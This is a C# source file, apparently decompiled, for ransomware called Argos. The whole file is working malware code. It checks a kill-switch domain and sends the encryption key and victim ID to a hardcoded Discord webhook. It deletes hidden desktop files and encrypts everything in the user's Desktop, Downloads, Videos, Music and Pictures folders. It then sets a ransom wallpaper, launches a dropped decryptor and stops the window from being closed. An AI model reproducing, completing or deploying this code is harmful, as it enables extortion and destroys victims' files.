using System;
using System.Collections.Specialized;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Argos_2._0.Properties;
using Microsoft.Win32;

namespace Argos_2._0;

public class Mainransom : Form
{
	public class CoreEncryption
	{
		public static byte[] AES_Encrypt(byte[] bytesToBeEncrypted, byte[] passwordBytes)
		{
			byte[] result = null;
			byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
			using (MemoryStream memoryStream = new MemoryStream())
			{
				using RijndaelManaged rijndaelManaged = new RijndaelManaged();
				rijndaelManaged.KeySize = 256;
				rijndaelManaged.BlockSize = 128;
				Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(passwordBytes, salt, 1000);
				rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
				rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
				rijndaelManaged.Mode = CipherMode.CBC;
				using (CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write))
				{
					cryptoStream.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
					cryptoStream.Close();
				}
				result = memoryStream.ToArray();
			}
			return result;
		}
	}

	public class CoreDecryption
	{
		public static byte[] AES_Decrypt(byte[] bytesToBeDecrypted, byte[] passwordBytes)
		{
			byte[] result = null;
			byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
			using (MemoryStream memoryStream = new MemoryStream())
			{
				using RijndaelManaged rijndaelManaged = new RijndaelManaged();
				rijndaelManaged.KeySize = 256;
				rijndaelManaged.BlockSize = 128;
				Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(passwordBytes, salt, 1000);
				rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
				rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
				rijndaelManaged.Mode = CipherMode.CBC;
				using (CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateDecryptor(), CryptoStreamMode.Write))
				{
					cryptoStream.Write(bytesToBeDecrypted, 0, bytesToBeDecrypted.Length);
					cryptoStream.Close();
				}
				result = memoryStream.ToArray();
			}
			return result;
		}
	}

	public class EncryptionFile
	{
		public void EncryptFile(string file, string password)
		{
			byte[] bytesToBeEncrypted = File.ReadAllBytes(file);
			byte[] bytes = Encoding.UTF8.GetBytes(password);
			bytes = SHA256.Create().ComputeHash(bytes);
			byte[] bytes2 = CoreEncryption.AES_Encrypt(bytesToBeEncrypted, bytes);
			File.WriteAllBytes(file, bytes2);
		}
	}

	private string USERID = Randomz(20);

	private const uint SPI_SETDESKWALLPAPER = 20u;

	private const uint SPIF_UPDATEINIFILE = 1u;

	private const uint SPIF_SENDWININICHANGE = 2u;

	private IContainer components = null;

	public Timer timer1;

	public Mainransom()
	{
		InitializeComponent();
		((Form)this).set_TopMost(true);
		((Form)this).set_TransparencyKey(((Control)this).get_BackColor());
	}

	private static string Randomz(int L)
	{
		string text = "qwertyuiopasdfghjklzxcvbnm1234567890";
		StringBuilder stringBuilder = new StringBuilder();
		Random random = new Random();
		for (int i = 1; i <= L; i++)
		{
			int index = random.Next(0, text.Length);
			char value = text[index];
			stringBuilder.Append(value);
		}
		return stringBuilder.ToString();
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		checkkillswitch();
	}

	private bool checkkillswitch()
	{
		try
		{
			HttpWebRequest httpWebRequest = WebRequest.Create("http://sfigouhsfg9sriufbhrweg0iwuefgho234ih5ug3405iu3gb5023i4po5j34g235345353tre23refs5h4poiuhg.com/") as HttpWebRequest;
			httpWebRequest.Method = "HEAD";
			HttpWebResponse httpWebResponse = httpWebRequest.GetResponse() as HttpWebResponse;
			httpWebResponse.Close();
			return httpWebResponse.StatusCode == HttpStatusCode.OK;
		}
		catch
		{
			start();
			return false;
		}
	}

	public static void sendWebHook(string url, string msg, string msg2)
	{
		http.Post(url, new NameValueCollection
		{
			{ "content", msg },
			{ "content", msg2 }
		});
	}

	private void start()
	{
		RegistryKey registryKey = Registry.CurrentUser.CreateSubKey("SOFTWARE\\ARGOSLOCKER");
		registryKey.SetValue("ID", USERID);
		registryKey.Close();
		sendWebHook("https://discord.com/api/webhooks/936354130631458917/tw8whO_omBwqaEe6tFRz2V0CgKb_RJ3jiJo5vJ7vu0gaxvN-XrvXVgBNT9ygZDq25NK6", "Key: diguyh3rtiu34gth9iu34tg398uhfb08uhd098guh3459tiu34ht8hdfv087yr", "   ID: " + USERID);
		File.WriteAllBytes("C:\\Ransom.png", Resources.Ransom);
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
		string[] array = (from f in Directory.EnumerateFiles(folderPath + "\\")
			where (new FileInfo(f).Attributes & FileAttributes.Hidden) == FileAttributes.Hidden
			select f).ToArray();
		string[] array2 = array;
		foreach (string path in array2)
		{
			try
			{
				File.Delete(path);
			}
			catch (Exception)
			{
			}
		}
		string folderPath2 = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
		string path2 = folderPath2 + "\\desktop.ini";
		try
		{
			File.Delete(path2);
		}
		catch (Exception)
		{
		}
		string environmentVariable = Environment.GetEnvironmentVariable("USERPROFILE");
		string text = Path.Combine(environmentVariable, "Downloads");
		string path3 = text + "\\desktop.ini";
		try
		{
			File.Delete(path3);
		}
		catch (Exception)
		{
		}
		Thread.Sleep(1000);
		Start_Encrypt();
	}

	[DllImport("user32.dll", SetLastError = true)]
	[return: MarshalAs(UnmanagedType.Bool)]
	private static extern bool SystemParametersInfo(uint uiAction, uint uiParam, string pvParam, uint fWinIni);

	private static void DisplayPicture(string file_name)
	{
		if (!SystemParametersInfo(20u, 0u, file_name, 0u))
		{
		}
	}

	private void Form1_FormClosing(object sender, FormClosingEventArgs e)
	{
		((CancelEventArgs)(object)e).Cancel = true;
	}

	private void Start_Encrypt()
	{
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory);
		string environmentVariable = Environment.GetEnvironmentVariable("USERPROFILE");
		string text = Path.Combine(environmentVariable, "Downloads");
		string text2 = Path.Combine(environmentVariable, "Videos");
		string text3 = Path.Combine(environmentVariable, "Music");
		string text4 = Path.Combine(environmentVariable, "Pictures");
		string[] files = Directory.GetFiles(folderPath + "\\", "*", SearchOption.AllDirectories);
		string[] files2 = Directory.GetFiles(text + "\\", "*", SearchOption.AllDirectories);
		string[] files3 = Directory.GetFiles(text2 + "\\", "*", SearchOption.AllDirectories);
		string[] files4 = Directory.GetFiles(text3 + "\\", "*", SearchOption.AllDirectories);
		string[] files5 = Directory.GetFiles(text4 + "\\", "*", SearchOption.AllDirectories);
		EncryptionFile encryptionFile = new EncryptionFile();
		string password = "diguyh3rtiu34gth9iu34tg398uhfb08uhd098guh3459tiu34ht8hdfv087yr";
		try
		{
			for (int i = 0; i < files.Length; i++)
			{
				try
				{
					encryptionFile.EncryptFile(files[i], password);
				}
				catch (Exception)
				{
				}
			}
			for (int j = 0; j < files2.Length; j++)
			{
				try
				{
					encryptionFile.EncryptFile(files2[j], password);
				}
				catch (Exception)
				{
				}
			}
			for (int k = 0; k < files3.Length; k++)
			{
				try
				{
					encryptionFile.EncryptFile(files3[k], password);
				}
				catch (Exception)
				{
				}
			}
			for (int l = 0; l < files4.Length; l++)
			{
				try
				{
					encryptionFile.EncryptFile(files4[l], password);
				}
				catch (Exception)
				{
				}
			}
			for (int m = 0; m < files5.Length; m++)
			{
				try
				{
					encryptionFile.EncryptFile(files5[m], password);
				}
				catch (Exception)
				{
				}
			}
		}
		catch (Exception)
		{
		}
	}

	private void button1_Click(object sender, EventArgs e)
	{
	}

	private void timer1_Tick(object sender, EventArgs e)
	{
		string file_name = "C:\\Ransom.png";
		DisplayPicture(file_name);
		File.WriteAllBytes("C:\\@argosd3crypter.exe", Resources.Argos_2_0_Decryptor);
		Process.Start("C:\\@argosd3crypter.exe");
		timer1.Stop();
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_0012: Unknown result type (might be due to invalid IL or missing references)
		//IL_001c: Expected O, but got Unknown
		//IL_00c1: Unknown result type (might be due to invalid IL or missing references)
		//IL_00cb: Expected O, but got Unknown
		components = new Container();
		timer1 = new Timer(components);
		((Control)this).SuspendLayout();
		timer1.set_Enabled(true);
		timer1.set_Interval(10000);
		timer1.add_Tick((EventHandler)timer1_Tick);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(10, 10));
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("Mainransom");
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Control)this).set_Text("Argos");
		((Form)this).add_FormClosing(new FormClosingEventHandler(Form1_FormClosing));
		((Form)this).add_Load((EventHandler)Form1_Load);
		((Control)this).ResumeLayout(false);
	}
}
